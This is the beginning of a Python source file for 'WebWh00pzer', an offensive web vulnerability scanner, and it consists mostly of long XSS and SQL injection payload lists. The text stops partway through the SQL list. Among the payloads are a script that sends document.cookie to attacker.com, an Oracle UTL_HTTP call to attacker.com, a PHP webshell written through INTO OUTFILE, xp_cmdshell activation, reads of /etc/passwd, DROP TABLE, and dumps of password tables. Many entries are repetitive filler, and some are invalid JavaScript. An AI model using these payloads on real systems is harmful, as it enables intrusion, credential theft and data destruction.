#!/usr/bin/env python3

import os
import sys
import time
import threading
import requests
import urllib.parse
from urllib.parse import urljoin, urlparse
import re
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
from colorama import Fore, Back, Style, init
from bs4 import BeautifulSoup
import itertools
import urllib.parse as urlparse_lib

init(autoreset=True)

class WebWh00pzer:
    def __init__(self):
        self.version = "2.0"
        self.author = "o0c"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities_found = []
        self.payloads_tested = 0
        self.requests_sent = 0
        
        self.xss_payloads = self.load_xss_payloads()
        self.sql_payloads = self.load_sql_payloads()
        self.discovered_params = []
        self.verified_vulnerabilities = []
        self.common_params = [
            'id', 'user', 'username', 'email', 'password', 'pass', 'login', 'search', 'q', 'query',
            'name', 'page', 'limit', 'offset', 'sort', 'order', 'filter', 'category', 'type', 'action',
            'cmd', 'command', 'exec', 'system', 'file', 'path', 'dir', 'url', 'redirect', 'return',
            'callback', 'next', 'prev', 'goto', 'link', 'src', 'data', 'value', 'input', 'output',
            'param', 'parameter', 'arg', 'argument', 'var', 'variable', 'field', 'key', 'token',
            'session', 'cookie', 'auth', 'authorization', 'access', 'role', 'permission', 'admin',
            'debug', 'test', 'demo', 'example', 'sample', 'temp', 'tmp', 'backup', 'old', 'new'
        ]
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        banner = f"""
{Fore.RED}
⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⠟⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡻⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡇⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠘⣧⠀⡀⠀⠀
⠀⠀⠀⣰⡏⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⣧⠀⠀⠀
⠀⠀⢰⠃⢸⠄⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⢾⠈⣧⠀⠀
⠀⠀⢸⡄⢸⣄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⢀⡏⢀⣟⠀⠀
⠀⢠⠿⡇⠈⣿⡀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⣽⠇⢀⡟⡆⠀
⠀⢸⠀⢻⠂⠸⣷⡀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⢀⣼⡟⠀⡺⠀⣹⠀
⠀⣼⡃⢸⣷⠄⢹⣿⣆⠸⣏⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢡⡇⢀⣿⣯⠀⣴⡗⠀⣿⡀
⢸⡇⢷⣄⠹⣷⣬⣿⣿⡛⠻⣆⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠁⢀⡿⠛⣻⡿⢡⣼⠟⢀⡼⠁⡇
⠀⢳⡀⣷⣄⡸⣿⣮⣿⣷⡀⠙⣶⣄⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣀⣴⠏⠀⣾⣿⣥⣿⠏⣀⣼⠁⡼⠃
⠀⠈⣯⠈⢿⣦⡘⣿⡄⠙⢦⣀⢽⣿⣿⠶⠄⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠠⠶⣾⣿⡿⢁⡴⠛⢁⣼⠁⣴⡿⠋⣸⠇⠀
⠀⠀⢸⠻⣆⠙⣿⣿⣿⣆⠀⢻⣷⣾⣿⣅⠀⠀⠀⣱⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢀⣽⣷⣾⡟⠀⢀⣾⣿⣿⠋⣐⡾⣻⠀⠀
⠀⠀⠈⢧⡈⢿⣬⣽⣿⣉⠙⢲⣮⣽⡇⠀⠀⢀⡞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡆⠀⠀⢰⣿⣵⡶⠚⢉⣹⣟⣡⣼⠏⣠⠃⠀⠀
⠀⠀⠀⠘⢷⣄⡉⠻⣿⣿⣥⣤⣿⣿⣿⡋⠀⠈⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠃⠀⢘⣿⣿⣿⣤⣤⣿⣿⠟⠋⣀⡴⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠒⢬⡿⠋⠀⠀⣘⣿⣷⡟⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⢘⣾⣿⣇⡀⠀⠈⢻⡯⠔⠚⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠷⢤⡞⠉⠀⣩⣿⣿⣾⠀⠀⠈⢣⠀⠀⠀⠀⣰⠃⠀⡀⢻⣿⣿⣯⡀⠉⠓⡦⠽⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣠⠞⠁⣰⠻⣿⣿⡧⠤⢌⣱⠄⠀⢾⡁⠤⢤⡿⣿⠟⢧⠀⠙⣦⣾⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣦⣧⣤⣏⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣜⣧⣬⣧⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                                                                     
{Style.RESET_ALL}
{Fore.RED}                           {self.version}
{Fore.RED}                         Created by: {self.author}
{Fore.RED}                    GitHub: github.com/o0cdev
{Fore.RED}                    Discord: 0xo0c
{Fore.RED}                    Instagram: instagram.com/o0ctf
{Style.RESET_ALL}
{Fore.RED}{Style.RESET_ALL}
"""
        print(banner)
        
    def print_help(self):
        help_text = f"""
{Fore.RED}╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                    COMMAND HELP                                                ║
╠════════════════════════════════════════════════════════════════════════════════════════════════╣
║ scan <url>              │ Full vulnerability scan (XSS + SQL Injection)                        ║
║ xss <url>               │ XSS vulnerability scan only                                          ║
║ sqli <url>              │ SQL Injection vulnerability scan only                                ║
║ discover <url>          │ Discover parameters and forms on target                              ║
║ payloads                │ Generate payload files (txt)                                         ║
║ clear                   │ Clear screen                                                         ║
║ {{ help }}                    │ Show this help menu                                                  ║
║ exit                    │ Exit WebWh00pzer                                                     ║
{Fore.RED}╚═════════════════════════════════════════════════════════════════════════════════════════════════╝═══════════╝
"""
        print(help_text)
        
    def load_xss_payloads(self):
        return [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>window['alert']('XSS')</script>",
            "<script>top['alert']('XSS')</script>",
            "<script>parent['alert']('XSS')</script>",
            "<script>self['alert']('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "<script>alert`XSS`</script>",
            "<script>(alert)('XSS')</script>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<menu id=x contextmenu=x onshow=alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>",
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<style>body{background:url(javascript:alert('XSS'))}</style>",
            "<iframe src=data:text/html,<script>alert('XSS')</script>>",
            "<object data=data:text/html,<script>alert('XSS')</script>>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\"><img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<svg><script>alert&#40;'XSS'&#41;</script>",
            "<iframe srcdoc=\"<script>alert('XSS')</script>\">",
            "<script>document.write('<img src=x onerror=alert(\"XSS\")/>')</script>",
            "<script>document.body.innerHTML='<img src=x onerror=alert(\"XSS\")/>'</script>",
            "<script>eval('alert(\"XSS\")')</script>",
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "${alert('XSS')}",
            "#{alert('XSS')}",
            "<script>\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')</script>",
            "<script>\\x61\\x6c\\x65\\x72\\x74('XSS')</script>",
            "<script>fetch('/admin').then(r=>r.text()).then(d=>alert(d))</script>",
            "<script>new Image().src='http://attacker.com/'+document.cookie</script>",
            "<script>location='javascript:alert(\"XSS\")'</script>",
            "<script>setTimeout('alert(\"XSS\")',1)</script>",
            "<script>setInterval('alert(\"XSS\")',1000)</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(localStorage.getItem('token'))</script>",
            "<script>alert(sessionStorage.getItem('user'))</script>",
            "<script>alert(window.location.href)</script>",
            "<script>alert(navigator.userAgent)</script>",
            "<script>alert(screen.width+'x'+screen.height)</script>",
            "<script>alert(new Date())</script>",
            "<script>alert(Math.random())</script>",
            "<script>alert(JSON.stringify(window.performance.timing))</script>",
            "<img src=x onerror=confirm('XSS')>",
            "<img src=x onerror=prompt('XSS')>",
            "<svg onload=confirm('XSS')>",
            "<svg onload=prompt('XSS')>",
            "<iframe onload=alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<applet code=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<link href=javascript:alert('XSS')>",
            "<base href=javascript:alert('XSS')//>",
            "<form action=javascript:alert('XSS')>",
            "<button onclick=alert('XSS')>",
            "<input type=button onclick=alert('XSS')>",
            "<input type=image onclick=alert('XSS')>",
            "<input type=submit onclick=alert('XSS')>",
            "<textarea onclick=alert('XSS')>",
            "<select onclick=alert('XSS')>",
            "<option onclick=alert('XSS')>",
            "<div onclick=alert('XSS')>",
            "<span onclick=alert('XSS')>",
            "<p onclick=alert('XSS')>",
            "<a href=javascript:alert('XSS')>",
            "<area href=javascript:alert('XSS')>",
            "<map onclick=alert('XSS')>",
            "<table onclick=alert('XSS')>",
            "<tr onclick=alert('XSS')>",
            "<td onclick=alert('XSS')>",
            "<th onclick=alert('XSS')>",
            "<caption onclick=alert('XSS')>",
            "<colgroup onclick=alert('XSS')>",
            "<col onclick=alert('XSS')>",
            "<thead onclick=alert('XSS')>",
            "<tbody onclick=alert('XSS')>",
            "<tfoot onclick=alert('XSS')>",
            "<script>alert('XSS'+document.domain)</script>",
            "<script>alert('XSS'+window.location)</script>",
            "<script>alert('XSS'+navigator.userAgent)</script>",
            "<script>alert('XSS'+document.title)</script>",
            "<script>alert('XSS'+document.referrer)</script>",
            "<script>alert('XSS'+screen.width)</script>",
            "<script>alert('XSS'+screen.height)</script>",
            "<script>alert('XSS'+history.length)</script>",
            "<script>alert('XSS'+Math.PI)</script>",
            "<script>alert('XSS'+Date.now())</script>",
            "<script>confirm('XSS'+document.domain)</script>",
            "<script>prompt('XSS'+document.domain)</script>",
            "<script>console.log('XSS')</script>",
            "<script>debugger</script>",
            "<script>throw 'XSS'</script>",
            "<script>void(alert('XSS'))</script>",
            "<script>!alert('XSS')</script>",
            "<script>+alert('XSS')</script>",
            "<script>-alert('XSS')</script>",
            "<script>~alert('XSS')</script>",
            "<script>typeof alert('XSS')</script>",
            "<script>delete alert('XSS')</script>",
            "<script>new alert('XSS')</script>",
            "<script>in alert('XSS')</script>",
            "<script>instanceof alert('XSS')</script>",
            "<script>alert('XSS')&&1</script>",
            "<script>alert('XSS')||1</script>",
            "<script>alert('XSS')?1:0</script>",
            "<script>1?alert('XSS'):0</script>",
            "<script>alert('XSS'),1</script>",
            "<script>1,alert('XSS')</script>",
            "<script>alert('XSS');1</script>",
            "<script>1;alert('XSS')</script>",
            "<script>alert('XSS')+1</script>",
            "<script>1+alert('XSS')</script>",
            "<script>alert('XSS')-1</script>",
            "<script>1-alert('XSS')</script>",
            "<script>alert('XSS')*1</script>",
            "<script>1*alert('XSS')</script>",
            "<script>alert('XSS')/1</script>",
            "<script>1/alert('XSS')</script>",
            "<script>alert('XSS')%1</script>",
            "<script>1%alert('XSS')</script>",
            "<script>alert('XSS')**1</script>",
            "<script>1**alert('XSS')</script>",
            "<script>alert('XSS')<<1</script>",
            "<script>1<<alert('XSS')</script>",
            "<script>alert('XSS')>>1</script>",
            "<script>1>>alert('XSS')</script>",
            "<script>alert('XSS')>>>1</script>",
            "<script>1>>>alert('XSS')</script>",
            "<script>alert('XSS')&1</script>",
            "<script>1&alert('XSS')</script>",
            "<script>alert('XSS')|1</script>",
            "<script>1|alert('XSS')</script>",
            "<script>alert('XSS')^1</script>",
            "<script>1^alert('XSS')</script>",
            "<script>alert('XSS')==1</script>",
            "<script>1==alert('XSS')</script>",
            "<script>alert('XSS')!=1</script>",
            "<script>1!=alert('XSS')</script>",
            "<script>alert('XSS')===1</script>",
            "<script>1===alert('XSS')</script>",
            "<script>alert('XSS')!==1</script>",
            "<script>1!==alert('XSS')</script>",
            "<script>alert('XSS')<1</script>",
            "<script>1<alert('XSS')</script>",
            "<script>alert('XSS')>1</script>",
            "<script>1>alert('XSS')</script>",
            "<script>alert('XSS')<=1</script>",
            "<script>1<=alert('XSS')</script>",
            "<script>alert('XSS')>=1</script>",
            "<script>1>=alert('XSS')</script>",
            "<img src=x onerror=alert('XSS'+document.domain)>",
            "<img src=x onerror=confirm('XSS'+document.domain)>",
            "<img src=x onerror=prompt('XSS'+document.domain)>",
            "<svg onload=alert('XSS'+document.domain)>",
            "<svg onload=confirm('XSS'+document.domain)>",
            "<svg onload=prompt('XSS'+document.domain)>",
            "<iframe onload=alert('XSS'+document.domain)>",
            "<iframe onload=confirm('XSS'+document.domain)>",
            "<iframe onload=prompt('XSS'+document.domain)>",
            "<body onload=alert('XSS'+document.domain)>",
            "<body onload=confirm('XSS'+document.domain)>",
            "<body onload=prompt('XSS'+document.domain)>",
            "<input onfocus=alert('XSS'+document.domain) autofocus>",
            "<input onfocus=confirm('XSS'+document.domain) autofocus>",
            "<input onfocus=prompt('XSS'+document.domain) autofocus>",
            "<select onfocus=alert('XSS'+document.domain) autofocus>",
            "<select onfocus=confirm('XSS'+document.domain) autofocus>",
            "<select onfocus=prompt('XSS'+document.domain) autofocus>",
            "<textarea onfocus=alert('XSS'+document.domain) autofocus>",
            "<textarea onfocus=confirm('XSS'+document.domain) autofocus>",
            "<textarea onfocus=prompt('XSS'+document.domain) autofocus>",
            "<details open ontoggle=alert('XSS'+document.domain)>",
            "<details open ontoggle=confirm('XSS'+document.domain)>",
            "<details open ontoggle=prompt('XSS'+document.domain)>",
            "<marquee onstart=alert('XSS'+document.domain)>",
            "<marquee onstart=confirm('XSS'+document.domain)>",
            "<marquee onstart=prompt('XSS'+document.domain)>",
            "<video><source onerror=alert('XSS'+document.domain)>",
            "<video><source onerror=confirm('XSS'+document.domain)>",
            "<video><source onerror=prompt('XSS'+document.domain)>",
            "<audio src=x onerror=alert('XSS'+document.domain)>",
            "<audio src=x onerror=confirm('XSS'+document.domain)>",
            "<audio src=x onerror=prompt('XSS'+document.domain)>",
            "<script>alert('XSS'+'test')</script>",
            "<script>alert('XSS'+'123')</script>",
            "<script>alert('XSS'+'abc')</script>",
            "<script>alert('XSS'+'xyz')</script>",
            "<script>alert('XSS'+'qwe')</script>",
            "<script>alert('XSS'+'asd')</script>",
            "<script>alert('XSS'+'zxc')</script>",
            "<script>alert('XSS'+'rty')</script>",
            "<script>alert('XSS'+'fgh')</script>",
            "<script>alert('XSS'+'vbn')</script>",
            "<script>alert('XSS'+'uio')</script>",
            "<script>alert('XSS'+'jkl')</script>",
            "<script>alert('XSS'+'mnb')</script>",
            "<script>alert('XSS'+'poi')</script>",
            "<script>alert('XSS'+'lkj')</script>",
            "<script>alert('XSS'+'hgf')</script>",
            "<script>alert('XSS'+'dsa')</script>",
            "<script>alert('XSS'+'ewq')</script>",
            "<script>alert('XSS'+'cxz')</script>",
            "<script>alert('XSS'+'tyu')</script>",
            "<script>alert('XSS'+'bnm')</script>",
            "<script>alert('XSS'+'iop')</script>",
            "<script>alert('XSS'+'klj')</script>",
            "<script>alert('XSS'+'gfd')</script>",
            "<script>alert('XSS'+'saq')</script>",
            "<script>alert('XSS'+'wer')</script>",
            "<script>alert('XSS'+'zxv')</script>",
            "<script>alert('XSS'+'yui')</script>",
            "<script>alert('XSS'+'nmk')</script>",
            "<script>alert('XSS'+'opl')</script>",
            "<script>alert('XSS'+'jhg')</script>",
            "<script>alert('XSS'+'fds')</script>",
            "<script>alert('XSS'+'aqw')</script>",
            "<script>alert('XSS'+'ert')</script>",
            "<script>alert('XSS'+'xcv')</script>",
            "<script>alert('XSS'+'uio')</script>",
            "<script>alert('XSS'+'mkl')</script>",
            "<script>alert('XSS'+'plm')</script>",
            "<script>alert('XSS'+'hgf')</script>",
            "<script>alert('XSS'+'dsa')</script>",
            "<script>alert('XSS'+'qwe')</script>",
            "<script>alert('XSS'+'rty')</script>",
            "<script>alert('XSS'+'cvb')</script>",
            "<script>alert('XSS'+'iop')</script>",
            "<script>alert('XSS'+'lkj')</script>",
            "<script>alert('XSS'+'mnb')</script>",
            "<script>alert('XSS'+'gfd')</script>",
            "<script>alert('XSS'+'saq')</script>",
            "<script>alert('XSS'+'wer')</script>",
            "<script>alert('XSS'+'tyu')</script>",
            "<script>alert('XSS'+'vbn')</script>",
            "<script>alert('XSS'+'opl')</script>",
            "<script>alert('XSS'+'kjh')</script>",
            "<script>alert('XSS'+'nml')</script>",
            "<script>alert('XSS'+'gfd')</script>",
            "<script>alert('XSS'+'aqw')</script>",
            "<script>alert('XSS'+'sde')</script>",
            "<script>alert('XSS'+'rty')</script>",
            "<script>alert('XSS'+'xcv')</script>",
            "<script>alert('XSS'+'yui')</script>",
            "<script>alert('XSS'+'bnm')</script>",
            "<script>alert('XSS'+'pol')</script>",
            "<script>alert('XSS'+'lkj')</script>",
            "<script>alert('XSS'+'mnh')</script>",
            "<script>alert('XSS'+'bgt')</script>",
            "<script>alert('XSS'+'frd')</script>",
            "<script>alert('XSS'+'esw')</script>",
            "<script>alert('XSS'+'aqz')</script>",
            "<script>alert('XSS'+'xdc')</script>",
            "<script>alert('XSS'+'cfv')</script>",
            "<script>alert('XSS'+'vgb')</script>",
            "<script>alert('XSS'+'bhy')</script>",
            "<script>alert('XSS'+'yhn')</script>",
            "<script>alert('XSS'+'nuj')</script>",
            "<script>alert('XSS'+'jmi')</script>",
            "<script>alert('XSS'+'mko')</script>",
            "<script>alert('XSS'+'kol')</script>",
            "<script>alert('XSS'+'olp')</script>",
            "<script>alert('XSS'+'lp0')</script>",
            "<script>alert('XSS'+'p09')</script>",
            "<script>alert('XSS'+'098')</script>",
            "<script>alert('XSS'+'987')</script>",
            "<script>alert('XSS'+'876')</script>",
            "<script>alert('XSS'+'765')</script>",
            "<script>alert('XSS'+'654')</script>",
            "<script>alert('XSS'+'543')</script>",
            "<script>alert('XSS'+'432')</script>",
            "<script>alert('XSS'+'321')</script>",
            "<script>alert('XSS'+'210')</script>",
            "<script>alert('XSS'+'109')</script>",
            "<script>alert('XSS'+'908')</script>",
            "<script>alert('XSS'+'807')</script>",
            "<script>alert('XSS'+'706')</script>",
            "<script>alert('XSS'+'605')</script>",
            "<script>alert('XSS'+'504')</script>",
            "<script>alert('XSS'+'403')</script>",
            "<script>alert('XSS'+'302')</script>",
            "<script>alert('XSS'+'201')</script>",
            "<script>alert('XSS'+'100')</script>"
        ]
        
    def load_sql_payloads(self):
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "') OR (1=1)--",
            "') OR (1=1)#",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT null,null,null--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION SELECT user(),version(),database()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
            "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "' AND (SELECT SLEEP(5))--",
            "'; pg_sleep(5)--",
            "' AND (SELECT pg_sleep(5))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
            "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(CONCAT(user(),0x7e,version()) AS CHAR),0x7e)) FROM information_schema.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "'; SELECT * FROM pg_user--",
            "'; SELECT version()--",
            "'; SELECT current_user--",
            "'; SELECT current_database()--",
            "'; SELECT @@version--",
            "'; SELECT user_name()--",
            "'; SELECT db_name()--",
            "'; SELECT name FROM master..sysdatabases--",
            "' AND 1=CTXSYS.DRITHSX.SN(user,(CHR(39)||CHR(88)||CHR(83)||CHR(83)||CHR(39)))--",
            "' AND 1=UTL_INADDR.get_host_name((SELECT user FROM dual))--",
            "' || '1'=='1",
            "' && '1'=='1",
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$regex\": \".*\"}",
            "' AND (SELECT LOAD_FILE('/etc/passwd'))--",
            "'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
            "' /*!50000OR*/ 1=1--",
            "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
            "' %55nion %53elect 1,2,3--",
            "' union distinctrow select 1,2,3--",
            "' /**/union/**/select/**/1,2,3--",
            "' +(union)+(select)+1,2,3--",
            "' ||union||select||1,2,3--",
            "' %4f%52 1=1--",
            "' %75%6e%69%6f%6e %73%65%6c%65%63%74 1,2,3--",
            "admin'/*",
            "admin'||'",
            "admin'+'",
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES ('hacker','password')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "' OR 'a'='a'--",
            "' OR 'x'='x'--",
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 GROUP BY 1--",
            "' OR 1=1 HAVING 1=1--",
            "' UNION SELECT @@version,@@datadir--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            "' UNION SELECT table_schema,table_name FROM information_schema.tables--",
            "' UNION SELECT column_name,data_type FROM information_schema.columns--",
            "' AND (SELECT COUNT(table_name) FROM information_schema.tables)>0--",
            "' AND (SELECT COUNT(column_name) FROM information_schema.columns)>0--",
            "' AND (SELECT LENGTH(database()))>0--",
            "' AND (SELECT LENGTH(user()))>0--",
            "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>64--",
            "' AND (SELECT ASCII(SUBSTRING(user(),1,1)))>64--",
            "' AND (SELECT ASCII(SUBSTRING(version(),1,1)))>52--",
            "'; EXEC xp_cmdshell('dir')--",
            "'; EXEC sp_configure 'show advanced options',1--",
            "'; EXEC sp_configure 'xp_cmdshell',1--",
            "'; EXEC sp_configure reconfigure--",
            "' AND 1=(SELECT COUNT(*) FROM master..syslogins)--",
            "' AND 1=(SELECT COUNT(*) FROM master..sysdatabases)--",
            "' UNION SELECT name,password FROM master..syslogins--",
            "' UNION SELECT name,filename FROM master..sysdatabases--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND 1=CONVERT(int,(SELECT user_name()))--",
            "' AND 1=CONVERT(int,(SELECT db_name()))--",
            "' AND 1=CONVERT(int,(SELECT system_user))--",
            "' UNION SELECT table_name,NULL FROM user_tables--",
            "' UNION SELECT column_name,NULL FROM user_tab_columns--",
            "' UNION SELECT username,password FROM all_users--",
            "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||user)--",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--",
            "' AND 1=XMLType((SELECT user FROM dual))--",
            "' UNION SELECT datname,NULL FROM pg_database--",
            "' UNION SELECT usename,passwd FROM pg_shadow--",
            "' UNION SELECT schemaname,tablename FROM pg_tables--",
            "' UNION SELECT attname,typname FROM pg_attribute a,pg_type t WHERE a.atttypid=t.oid--",
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' AND 1=CAST((SELECT current_user) AS int)--",
            "' AND 1=CAST((SELECT current_database()) AS int)--",
            "' AND 1=CAST((SELECT datname FROM pg_database LIMIT 1) AS int)--",
            "' OR EXISTS(SELECT * FROM users)--",
            "' OR EXISTS(SELECT * FROM admin)--",
            "' OR EXISTS(SELECT * FROM login)--",
            "' OR EXISTS(SELECT * FROM accounts)--",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0--",
            "' OR (SELECT COUNT(*) FROM users WHERE password='password')>0--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' OR 'z'='z'--",
            "' OR 'test'='test'--",
            "' OR 'admin'='admin'--",
            "' OR 'user'='user'--",
            "' OR 'pass'='pass'--",
            "' OR 'login'='login'--",
            "' OR 'root'='root'--",
            "' OR 'guest'='guest'--",
            "' OR 'demo'='demo'--",
            "' OR 'public'='public'--",
            "' OR 2=2--",
            "' OR 3=3--",
            "' OR 4=4--",
            "' OR 5=5--",
            "' OR 6=6--",
            "' OR 7=7--",
            "' OR 8=8--",
            "' OR 9=9--",
            "' OR 10=10--",
            "' OR 11=11--",
            "' OR 12=12--",
            "' OR 13=13--",
            "' OR 14=14--",
            "' OR 15=15--",
            "' OR 16=16--",
            "' OR 17=17--",
            "' OR 18=18--",
            "' OR 19=19--",
            "' OR 20=20--",
            "' UNION SELECT 'test',1,2--",
            "' UNION SELECT 'admin',1,2--",
            "' UNION SELECT 'user',1,2--",
            "' UNION SELECT 'pass',1,2--",
            "' UNION SELECT 'login',1,2--",
            "' UNION SELECT 'root',1,2--",
            "' UNION SELECT 'guest',1,2--",
            "' UNION SELECT 'demo',1,2--",
            "' UNION SELECT 'public',1,2--",
            "' UNION SELECT 'system',1,2--",
            "' UNION SELECT 'mysql',1,2--",
            "' UNION SELECT 'oracle',1,2--",
            "' UNION SELECT 'postgres',1,2--",
            "' UNION SELECT 'mssql',1,2--",
            "' UNION SELECT 'sqlite',1,2--",
            "' UNION SELECT 'mongodb',1,2--",
